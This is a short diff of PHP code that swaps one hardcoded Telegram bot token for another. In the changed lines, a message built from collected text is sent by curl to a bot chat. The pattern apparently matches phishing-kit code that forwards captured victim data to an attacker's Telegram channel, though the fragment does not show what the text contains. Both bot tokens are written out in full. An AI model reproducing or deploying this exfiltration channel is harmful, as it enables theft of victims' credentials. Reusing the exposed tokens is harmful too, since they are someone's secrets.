@@ -468,7 +468,7 @@ $text";
 $message1 = rawurlencode($message1);
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot1226561516:AAG9u_9oezoI2GL8HOb6ULhrKZrV2kbbbbU/sendMessage?chat_id=1376799606&text=$message1");
+curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot1449592358:AAHkDei-6QQR7an_vIasxjFCiGH_syL0NII/sendMessage?chat_id=1376799606&text=$message1");
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $result = curl_exec($ch);
